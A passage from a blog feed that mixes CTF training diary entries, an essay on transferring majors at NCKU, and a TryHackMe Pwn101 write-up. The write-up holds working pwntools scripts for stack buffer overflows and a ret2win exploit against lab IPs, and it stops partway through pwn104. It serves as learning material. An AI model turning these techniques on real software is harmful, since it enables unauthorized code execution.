style="text-align:left">0xffff0002</th><th style="text-align:left">0xffff0003</th></tr></thead><tbody><tr><td style="text-align:left">Big-Endian</td><td style="text-align:left">AA</td><td style="text-align:left">BB</td><td style="text-align:left">CC</td><td style="text-align:left">DD</td></tr><tr><td style="text-align:left">Little-Endian</td><td style="text-align:left">DD</td><td style="text-align:left">CC</td><td style="text-align:left">BB</td><td style="text-align:left">AA</td></tr></tbody></table><p>This is very important for us to enter our code in the right order later when we have to tell the CPU to which address it should point.</p>]]></content>
      
      
      <categories>
          
          <category> StudyNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Registers </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 19] 上完Yuawn的Pwn第一堂課！</title>
      <link href="/posts/289c779a/"/>
      <url>/posts/289c779a/</url>
      
        <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>今天把 Yuawn 的第一堂課上完了，明天來看看第二堂。然後今天沒有寫題目，不小心有點小偷懶了。明天趕緊繼續加油！</p><h1 id="今日進度">今日進度</h1><ol><li>Yuawn 的 Binary Exploitation (Pwn) - Basic</li></ol><h1 id="今日狀態">今日狀態</h1><ul><li><p>起床時間：<code>11：00</code></p></li><li><p>知識量：⭐⭐⭐</p></li><li><p>疲勞程度：⭐⭐</p></li><li><p>精神狀態：⭐⭐⭐⭐</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF Training </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> CTF </tag>
            
            <tag> CyberSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 18] Yuawn的課真的上的不錯，大推大推</title>
      <link href="/posts/dfbc9f18/"/>
      <url>/posts/dfbc9f18/</url>
      
        <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>越學越覺得 Pwn 很有趣，以前我記得我最害怕的就是 Pwn，但現在反而覺得挺有趣挺好玩的。但話說最近都在打 Pwn，Web 跟 Crypto 很久沒有練習了，可能到時候也得回來打一下這兩個。</p><h1 id="今日進度">今日進度</h1><ol><li>繼續上 Yuawn 的課程</li><li>THM 的 Pwn101 第五題</li></ol><h1 id="今日狀態">今日狀態</h1><ul><li><p>起床時間：<code>09：30</code></p></li><li><p>知識量：⭐⭐⭐</p></li><li><p>疲勞程度：⭐⭐</p></li><li><p>精神狀態：⭐⭐⭐⭐</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF Training </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> CTF </tag>
            
            <tag> CyberSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 17] HTB和THM幫助我學Pwn</title>
      <link href="/posts/db00a960/"/>
      <url>/posts/db00a960/</url>
      
        <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>雖然已經過了 12 點，但我還是趕緊來補一下。</p><p>今天跟高中朋友們出去了！一起去了咖啡廳工作了一下午！效率還不錯，而且真的很需要咖啡 XD。</p><h1 id="今日進度">今日進度</h1><ol><li>HTB Academy 的 Stack-Based Buffer Overflows on Linux x86</li><li>THM 的 Pwn101 第四題</li></ol><h1 id="今日狀態">今日狀態</h1><ul><li><p>起床時間：<code>09：30</code></p></li><li><p>知識量：⭐⭐⭐⭐</p></li><li><p>疲勞程度：⭐⭐</p></li><li><p>精神狀態：⭐⭐⭐⭐</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF Training </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> CTF </tag>
            
            <tag> CyberSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>成大不分系轉系經驗分享</title>
      <link href="/posts/baaabc06/"/>
      <url>/posts/baaabc06/</url>
      
        <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>寫這篇呢，主要是因為當初自己在選填大學志願的階段，翻了很多的成大不分系的文章，但是一直找不太到很確切的資訊。這讓我當初很糾結（因為我在入學前就很明確的知道自己的目標，這我後面會提），所以想要寫下這篇來回饋給後面的學弟妹們可以參考，希望對各位有幫助。</p><p>有句話我一直非常喜歡，是辯論圈中一個很厲害的學長說的。共勉之。</p><blockquote><p>「知識是甚麼？知識就是我們迎風撒出一把沙，然後沙會瀰散在每個前行人的衣領中」　—　<strong><em>林聖偉</em></strong></p></blockquote><h1 id="我的高中">我的高中</h1><p>我高中讀的是台中的明道中學，因為我們私校的系統和一般公立不太一樣，所以其實我們要在國中滿早的時候就決定高中要念文組還是理組。雖然我國中的時候理科成績比文科好，但是我在進入高中的時候卻是選擇了念文組。這是因為我當時一直想要念法律系，所以我也在高中的時候參加了很多法律相關的活動，包括辯論競賽等等。</p><p>但我記得我小時候（小學）一直有一個想要當駭客的夢想，只是小時候常常覺得這離自己太過於遙遠，所以從未嘗試去實現。直到高三學測前的四五十天前，我莫名其妙地接觸到了 Python（當時候女朋友說工程師很帥所以去學，愛情真偉大），也接觸到了 Kali Linux。我慢慢發現我自己相較於法律，更喜歡寫程式。因為當時後的我讀書讀到很疲乏，而寫程式可以很好的幫助我進入心流的狀態。在心流的狀態裡面，我可以很專注地在自己正在做的事情上面，並且我能夠很有意識的感受到我作為一個生命主體的存在。</p><p>因此從那時候開始，我就下定決心要轉換跑道了。我決定不念法律系了，我想要念資工系。</p><p>但是我找了很久，心裏打的算盤也一換再換。從原本的資財系，到後來的資管系。我找了很多種方法，看看台灣的升學制度中，有沒有甚麼方式可以讓我學測不考自然，也可以在大學進到資訊相關的科系（因為當時學測已經報名完了，所以只有考了數 A、數 B、社會、國文、英文）。找了很久之後發現，原來有成大不分系這條路，他當初只採計國文、英文、數 A 這三科的成績，所以我就放棄念社會科，把最後的時間都留在準備這三個科目上。</p><h1 id="待了一年的成大不分系">待了一年的成大不分系</h1><p>後來我也如願進到了這裡，開始了我的大學生活。這裡的選課方式比較特別，別的科系都會有內訂的必修課在課表上，但不分系沒有。不分系的課表是完全空白的，需要學生自己選課來修。這給了我們很多的自由，同時也要求我們需要審慎考慮我們自己要走的路。（不過現在有聽說可能會修改選課的制度，不知道之後的不分系會變成怎樣，且看且走吧！）</p><p>而早就確定好目標的我，在大一的上下學期，都把課表修滿了資工系（資訊工程學系）大一的必修課。其他的課就挑一些比較甜的通識來拉分。相信會找到這篇文章的各位都知道不分系轉系（分發）的規定，但如果你不知道，我簡單說明下。</p><p>不分系的分發標準是有一份文件，裡面涵蓋了所有可以分發的科系的分發標準。以資工系為例，分發標準就是要休息程式設計相關課程，並且大一的總成績達到 82 以上。同時，並不代表你達到標準就可以成功分發到該系，因為這個分發是由不分系的主任去和該系的主任洽談的，所以詳細情況必須要看該年兩個系的主任是如何洽談的。</p><p>說明完分發的規則，應該就可以理解為甚麼我會挑一些甜的通識來拉分了。但我的大一生活真的就是一直讀書，當分奴，拼轉系嗎？</p><p>其實除了讀書，我也參加了很多活動。舉例來說，包括 <a href="https://cx330.tw/posts/23950b86/">GDSC 的專案開發</a>、SCIST 的資安課程、AIS3 的 CTF 競賽等。因為我一直相信，除了分數，還有更重要的事（明道的 Slogan）。我不希望像很多人一樣，把大學念的像高中、國中一樣（甚至不如）。我想像中理想的大學是可以參與很多活動，在不同的活動中學習、拓染人脈，大膽嘗試自己想做的事情，不受侷限；而不是整天就是在宿舍裡面讀書，而忽略了其他大學中更多更重要的資源（包括自學的能力）。</p><p>話說這麼多，那成績怎麼辦？所以說，時間管理真的很重要。在參加這麼多活動的同時，還得兼顧成績，確實不容易。因此平常就要培養讀書的習慣，不能等到考前才在讀書。我們高中老師也常和我們說，大學很多時候知識是要靠自己去獲取的，或許就是這麼個道理吧！當然，如果你為了轉系，選擇在大一的時候不參與其他活動，等大二成功分發之後再好好去闖，那也很棒，也不失為一個好的策略！</p><h1 id="轉系好轉嗎">轉系好轉嗎</h1><p>說實話，這個問題我不太有一個很明確的答案。就如同我前面所說，每一屆各系的主任都不一定一樣，所以洽談的結果也不一定會和我們這屆相同。但即使如此，我還是可以分享一下我所知道的這兩屆（我這屆還有我們的上一屆）。在我們這兩屆想要轉資工系的人都滿多的，115 這屆總共是有八個人轉到資工系，而 116 這屆共有十個人轉入。</p><p>然後據我所知有些人的分數可能就剛好在 82 分的邊緣（甚至低於 82 一點點），但還是都是順利轉入了。不過雖然這樣看起來很好轉，但其實現在學校對不分系的福利砍得越來越多，所以如果想要分發的學弟妹可能還是要稍微顧一下成績。因為當初系上發給我們的通知單上面也是有說明，會擇優分發。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240726142924421.png" alt="通知信"></p><p>所以說我們這兩屆的結果並不能代表不分系的運作就是如此，只能說我們的運氣不錯。如果學弟妹們也想要分發到其他的系（尤其是熱門科系），<strong>要多讀書</strong>，<strong>要多讀書</strong>，<strong>要多讀書</strong>。</p><h1 id="結語">結語</h1><p>最後來說說不分系到底適合什麼樣的人就讀吧！</p><ol><li>像我一樣想要轉換跑道的人，因為台灣學制的關係，如果你想從文組轉理組或理組轉文組會滿挫折的。而成大不分系就是一個很好的方式可以幫你過渡。</li><li>想要多元發展，多邊形戰士。因為不分系的選課制度真的很適合你去學習不同的專業，讓自己具備不同的技能。不分系也有很多從外系轉來的同學，就是因為意識到多元發展在現在社會的重要性。</li><li>還不確定自己的定位，想要多方嘗試、多方探索的學生。同樣受益於不分系的選課制度，你可以很自由很大膽的探索你的大學生活。</li></ol><p>以上的這幾種學生，我相信不分系會是你很棒的選擇。但如果你是想要去 XX 系但是學測沒考上，所以想要用不分系當跳板進到 XX 系的，我反而不那麼建議。一來是因為你進了不分系不代表你就能進入 XX 系，你同樣要經過很多考驗；二來是面試的時候教授可能不太會接受這樣的理由，畢竟教授們不會希望這個本應為旋轉門的系變成一般學生的跳板。</p><p>那這差不多就是這次的分享的，如果這篇文章有幫助到你，那就太好了！如果有任何的問題也都歡迎透過任何的聯絡方式聯絡我（在我的網站上應該找的到）。祝各位大學生活順利！</p>]]></content>
      
      
      <categories>
          
          <category> LifeAndTalk </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NCKU </tag>
            
            <tag> CCEP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 16] 計畫的一半！</title>
      <link href="/posts/86a224b6/"/>
      <url>/posts/86a224b6/</url>
      
        <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>從澎湖回來之後好懷念待在澎湖的日子，澎湖那種很慢的生活真的很令人嚮往欸。今天起床後就覺得澎湖真的很好就是東西有點小貴，而且澎湖的海真的是很漂亮。</p><h1 id="今日進度">今日進度</h1><p>今天寫了題 Pwn 題，然後中間遇到了些 MOVAPS 的問題所以卡了一些時間，上網找了影片和 Writeup 才寫出來的，總之挺坎坷。不過也是學到挺多的。反正今天是寫到了 Pwn101 裡面的 Pwn103 啦。</p><ol><li><a href="https://cx330.tw/posts/83b7f1b/">[THM] Pwn101 Writeup</a></li></ol><h1 id="今日狀態">今日狀態</h1><ul><li><p>起床時間：<code>12：00</code></p></li><li><p>知識量：⭐⭐⭐</p></li><li><p>疲勞程度：⭐⭐⭐⭐</p></li><li><p>精神狀態：⭐⭐⭐</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF Training </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> CTF </tag>
            
            <tag> CyberSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 15] 我在澎湖刷THM的Pwn題目</title>
      <link href="/posts/9071560f/"/>
      <url>/posts/9071560f/</url>
      
        <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>雖然今天在澎湖了，但是還是抽空寫了些題目！其實我一直很嚮往在各處旅行的途中寫 Code，我覺得對我來說是一件很浪漫的事情 XD。(期待之後某日能成為 Digital nomad)</p><h1 id="今日進度">今日進度</h1><p>今天寫了兩題，他是一個 Room，裡面共有十題。都是簡單的 BOF，所以說也沒花太多時間，</p><ol><li><a href="https://cx330.tw/posts/83b7f1b/">[THM] Pwn101 Writeup</a></li></ol><h1 id="今日狀態">今日狀態</h1><ul><li><p>起床時間：<code>09：00</code></p></li><li><p>知識量：⭐⭐⭐</p></li><li><p>疲勞程度：⭐⭐⭐</p></li><li><p>精神狀態：⭐⭐⭐⭐</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF Training </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> CTF </tag>
            
            <tag> CyberSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[THM] Pwn101 Writeup</title>
      <link href="/posts/83b7f1b/"/>
      <url>/posts/83b7f1b/</url>
      
        <content type="html"><![CDATA[<h1 id="Challenge-1-pwn101">Challenge 1 - pwn101</h1><p>First, we use IDA to decompile the binary it gave us. We can see that the program declare a 60 bytes array for char v4. And the winnning condition is to use v4 to overflow and cover the value of v5, which is 1337 initially. Since it didn’t ask us to make v5 to a specific value, we can just make sure it not equal to 1337.</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240720141210657.png" alt="IDA Decompiled Code"></p><p>To do that, I use a Python script to do it.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;10.10.153.228&quot;</span>, <span class="number">9001</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;Type the required ingredients to make briyani:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;A&quot;</span>*<span class="number">61</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240720141712693.png" alt="Flag"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">THM&#123;7h4t&#x27;s_4n_3zy_oveRflowwwww&#125;</span><br></pre></td></tr></table></figure><h1 id="Challenge-2-pwn102">Challenge 2 - pwn102</h1><p>First step, IDA decompile the binary.</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240720144645154.png" alt="IDA Decompiled Code"></p><p>According to the code, we can know that the char v4 is a 104 bytes array, and the winning condition is to let v5 equals to <code>0xC0FF330000C0D3</code>. So we can simply overflow the v4 to cover v5. The exploit is as follow.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">104</span> + p64(<span class="number">0xC0FF330000C0D3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;10.10.153.228&quot;</span>, <span class="number">9002</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Am I right?&quot;</span>)</span><br><span class="line">r.sendline(payload)</span><br></pre></td></tr></table></figure><p>By running this script, we can get the shell to cat the flag out.</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240720144940194.png" alt="Flag"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">THM&#123;y3s_1_n33D_C0ff33_to_C0d3_&lt;3&#125;</span><br></pre></td></tr></table></figure><h1 id="Challenge-3-pwn103">Challenge 3 - pwn103</h1><p>First, I use <code>checksec</code> to check the binary protection.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/CTF/THM/pwn103]</span><br><span class="line">└─$ pwn checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/kali/CTF/THM/pwn103/pwn&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>Next, I use IDA to decompile the binary so that I can check where is the vulnerability easier. If you check the decompiled code throughly, you will find out the vuln is in the <code>general()</code> function, which is the 3rd choice in the menu (You can also find the vuln if you run the binary and test each choice on the menu). The code of the <code>general()</code> function is as follows.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">general</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **v0; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(asc_4023AA);</span><br><span class="line">  <span class="built_in">puts</span>(aJopraveenHello);</span><br><span class="line">  <span class="built_in">puts</span>(aJopraveenHopeY);</span><br><span class="line">  <span class="built_in">puts</span>(aJopraveenYouFo);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;------[pwner]: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s1);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;yes&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(aTryHarder);</span><br><span class="line">  <span class="built_in">puts</span>(aJopraveenGg);</span><br><span class="line">  <span class="keyword">return</span> main((<span class="type">int</span>)aJopraveenGg, (<span class="type">const</span> <span class="type">char</span> **)<span class="string">&quot;yes&quot;</span>, v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We can notice that the vuln is at the <code>scanf()</code>, which allows us to cover the value of <code>s1</code>. Furthermore, I found a suspicious function in gdb.</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240725152515328.png" alt="GDB"></p><p>The <code>admins_only()</code> function looks interesting. After checking the decompiled code in IDA, I found that it turns out to be dangerous.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">admins_only</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(asc_403267);</span><br><span class="line">  <span class="built_in">puts</span>(aWelcomeAdmin);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>It open the shell for us! The thing is, how can we access this function? Until now, we can probably know that this is a ret2win problem. We need to cover the return address to gain access to the dangerous function. So I use <code>cyclic 100</code> to create the pattern to know the offset of the padding.</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240725153412668.png" alt="Find the offset by cyclic"></p><p>Then by using the <code>cyclic -l faaaaaaa</code> to look up the offset value, we get the offset is 40.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic -l faaaaaaa</span><br><span class="line">Finding cyclic pattern of 8 bytes: b<span class="string">&#x27;faaaaaaa&#x27;</span> (hex: 0x6661616161616161)</span><br><span class="line">Found at offset 40</span><br></pre></td></tr></table></figure><p>Next step is to find the address of <code>admins_only()</code>. Since the binary has no PIE, the address will be always fixed. To get the address, we can simply type in <code>print &amp;admins_only</code> in gdb.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">print</span> &amp;admins_only</span><br><span class="line"><span class="variable">$1</span> = (&lt;text variable, no debug info&gt; *) 0x401554 &lt;admins_only&gt;</span><br></pre></td></tr></table></figure><p>Now, we know that the address of <code>admins_only()</code> is <code>0x401554</code>, so we can start writing the exploit!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">offset = <span class="number">40</span></span><br><span class="line">admin_only_address = <span class="number">0x401554</span></span><br><span class="line">padding = <span class="string">b&quot;A&quot;</span> * offset</span><br><span class="line"></span><br><span class="line">payload = padding + p64(admin_only_address)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;10.10.194.195&quot;</span>, <span class="number">9003</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>But when we execute the script, it won’t give us the shell. After watching this video, I understand that there’s a MOVAPS issue.</p><div style="position: relative; width: 100%; height: 0; padding-bottom: 56.25%;">    <iframe style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;" src="https://www.youtube.com/embed/-VUtXwDm5yQ" frameborder="0" allowfullscreen></iframe></div><br/><p>So how do we solve the MOVAPS issue? <a href="https://ropemporium.com/guide.html">This articel</a> tells us the answer.</p><blockquote><p><strong>The MOVAPS issue</strong><br>If you’re segfaulting on a <code>movaps</code> instruction in <code>buffered_vfprintf()</code> or <code>do_system()</code> in the x86_64 challenges, then ensure the stack is 16-byte aligned before returning to GLIBC functions such as <code>printf()</code> or <code>system()</code>. Some versions of GLIBC uses <code>movaps</code> instructions to move data onto the stack in certain functions. The 64 bit calling convention requires the stack to be 16-byte aligned before a <code>call</code> instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. <code>movaps</code> triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra <code>ret</code> before returning into a function or return further into a function to skip a <code>push</code> instruction.</p></blockquote><p>Here I use the first method, which is add a ret gadget in my ROP (Return-Oriented Programming) chain. To find the ret gadget, we can type <code>layout asm</code> in gdb.</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240725162429324.png" alt="ret gadget"></p><p>Now we can write the exploit with this solution to the MOVAPS issue.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">offset = <span class="number">40</span></span><br><span class="line">admin_only_address = <span class="number">0x401554</span></span><br><span class="line">padding = <span class="string">b&quot;A&quot;</span> * offset</span><br><span class="line">ret_gadget = <span class="number">0x4016E0</span>  <span class="comment"># Solve the MOVAPS issue</span></span><br><span class="line"></span><br><span class="line">payload = padding + p64(ret_gadget) + p64(admin_only_address)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;10.10.194.195&quot;</span>, <span class="number">9003</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>By running the script, we can get the shell and cat out the flag.txt!</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240725163326781.png" alt="Pwned!"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">THM&#123;w3lC0m3_4Dm1N&#125;</span><br></pre></td></tr></table></figure><h1 id="Challenge-4-pwn104">Challenge 4 - pwn104</h1><p>Let’s start this one by running the program!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/CTF/THM/pwn104]</span><br><span class="line">└─$ ./pwn104-1644300377109.pwn104 </span><br><span class="line">       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐</span><br><span class="line">        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ </span><br><span class="line">        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘</span><br><span class="line">                 pwn 104          </span><br><span class="line"></span><br><span class="line">I think I have some super powers 💪</span><br><span class="line">especially executable powers 😎💥</span><br><span class="line"></span><br><span class="line">Can we go <span class="keyword">for</span> a fight? 😏💪</span><br><span class="line">I<span class="string">&#x27;m waiting for you at 0x7fff6e63d650</span></span><br></pre></td></tr></table></figure><p>If you run the program more than 1 time, you will probably notice that the address given by the program is changing each time. To know why, let’s step into the reverse part to see it’s decompiled code. The following is the code.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setup(argc, argv, envp);</span><br><span class="line">  banner();</span><br><span class="line">  <span class="built_in">puts</span>(aIThinkIHaveSom);</span><br><span class="line">  <span class="built_in">puts</span>(aEspeciallyExec);</span><br><span class="line">  <span class="built_in">puts</span>(aCanWeGoForAFig);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;I&#x27;m waiting for you at %p\n&quot;</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">200uLL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In this program, we don’t have any vulnerable function to call or return to, so we can obtain the shell only by the shellcode. Look the code above, I notice that there’s a vulnerability at the read function. The vulnerability is not caused by the function per se; rather, it’s caused by the programmer.</p><p>If we check the manual of the <code>read()</code> function in C, we can see that this function will read up to a count that set by the programmer. So it’s designed to be a secure function, not like the <code>gets()</code> function.</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240728225456197.png" alt="read(2) — Linux manual page"></p><p>But in this case, the program designer allocated a buffer with a size of 80 bytes and set the <code>read()</code> function can read up to 200 bytes. That’s where the vuln came from. Since 200 is way larger than 80, we can still input some malicious stuff to pwn this binary. The PoC is as follows (the segmentation fault).</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240728232628241.png" alt="PoC"></p><p>The first step is to find the offset to overwrite the RIP register. Here I still use the cyclic tool to generate an input with the length of 100 bytes by the command <code>cyclic 100</code>.</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240728231622992.png" alt="GDB"></p><p>Then we use <code>cyclic -l laaaaaa</code> to lookup the offset, which is 88 in my case. After getting the offset, we can start writing the exploit. Here’s how it will go.</p><ol><li>Get the leak address given by the program.</li><li>Generate the shellcode by shellcraft.</li><li>Inject the shellcode to the buf.</li><li>Control the execution flow to retrun to the shellcode.</li></ol><p>To generate the correct shellcode, we need to know some information of the remote system, including the architecture and the OS.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/CTF/THM/pwn104]</span><br><span class="line">└─$ file pwn104-1644300377109.pwn104 </span><br><span class="line">pwn104-1644300377109.pwn104: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=60e0bab59b4e5412a1527ae562f5b8e58928a7cb, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure><p>So in this case, we need to set the architecture to 